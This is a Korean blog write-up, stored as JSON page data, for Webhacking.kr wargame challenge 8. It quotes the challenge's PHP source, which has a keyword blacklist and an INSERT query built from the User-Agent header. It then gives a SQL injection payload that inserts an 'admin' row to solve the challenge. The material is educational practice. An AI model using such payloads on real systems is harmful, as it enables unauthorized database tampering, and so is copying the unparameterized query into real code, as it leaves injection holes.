{"pageProps":{"post":{"slug":"2017-03-27-webhackingkr8","content":"\n![](/assets/posts/webhackingkr/8_main.png)\n\n8번 문제는 새로고침을 누르면 done! (0/70) 의 카운트가 올라가는데\n문제 푸는데는 별 상관이 없는거 같다..\n이 첫 페이지 소스를 보면 index.phps가 주석 처리 되어있고 index.phps는 다음과 같다.\n\n```php\n<?\n\n$agent=getenv(\"HTTP_USER_AGENT\");\n$ip=$_SERVER[REMOTE_ADDR];\n\n$agent=trim($agent);\n\n$agent=str_replace(\".\",\"_\",$agent);\n$agent=str_replace(\"/\",\"_\",$agent);\n\n$pat=\"/\\/|\\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\\+|\\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\\([0-9]|sys|pass|\\.|like|and|\\'\\'|sub/\";\n\n$agent=strtolower($agent);\n\nif(preg_match($pat,$agent)) exit(\"Access Denied!\");\n\n$_SERVER[HTTP_USER_AGENT]=str_replace(\"'\",\"\",$_SERVER[HTTP_USER_AGENT]);\n$_SERVER[HTTP_USER_AGENT]=str_replace(\"\\\"\",\"\",$_SERVER[HTTP_USER_AGENT]);\n\n$count_ck=@mysql_fetch_array(mysql_query(\"select count(id) from lv0\"));\nif($count_ck[0]>=70) { @mysql_query(\"delete from lv0\"); }\n\n\n$q=@mysql_query(\"select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'\");\n\n$ck=@mysql_fetch_array($q);\n\nif($ck)\n{ \necho(\"hi <b>$ck[0]</b><p>\");\nif($ck[0]==\"admin\")\n\n{\n@solve();\n@mysql_query(\"delete from lv0\");\n}\n\n\n}\n\nif(!$ck)\n{\n$q=@mysql_query(\"insert into lv0(agent,ip,id) values('$agent','$ip','guest')\") or die(\"query error\");\necho(\"<br><br>done!  ($count_ck[0]/70)\");\n}\n\n\n?>\n```\n\n$agent 변수에 USER-AGENT 값을 넣고 필터링 검사를 하는데, id가 admin일 때 문제가 풀린다. \n$agent,$ip,id를 insert 쿼리로 데이터베이스에 넣어주는데 quest로 되어있어서 admin으로 어떻게 만들까 고민을 했는데\ninsert 쿼리는 values에 콤마를 사용해 여러개의 데이터를 집어넣을 수 있다.\n\n`insert into lv0('(아무값)','127.0.0.1','admin') values('(아무값','$ip','guest')`\n\n![](/assets/posts/webhackingkr/8_burf1.png)\n\nagent에 인젝션을 해야 하므로 Burp Suite를 이용해 User-Agent에 `(아무값)','127.0.0.1','admin'),('아무값` 을 넣어 Forward 해준다.\n그러면 데이터베이스에 (아무값) 127.0.0.1 admin , (아무값) 127.0.0.1 guest 2개가 동시에 생성되었을 것이다.\n\n![](/assets/posts/webhackingkr/8_burf2.png)\n\n다시 User-Agent에 방금 데이터베이스에 생성한 admin값을 가지는 아무값을 넣어 Forward 해주면 문제가 풀린다.\n\n![](/assets/posts/webhackingkr/8_clear.png)\n","layout":"post","title":"[Webhacking.kr] 8","categories":["Webhacking.kr"],"excerpt":" ","comments":true,"share":true,"tags":["Web-hacking","webhacking.kr","write-up"]}},"__N_SSG":true}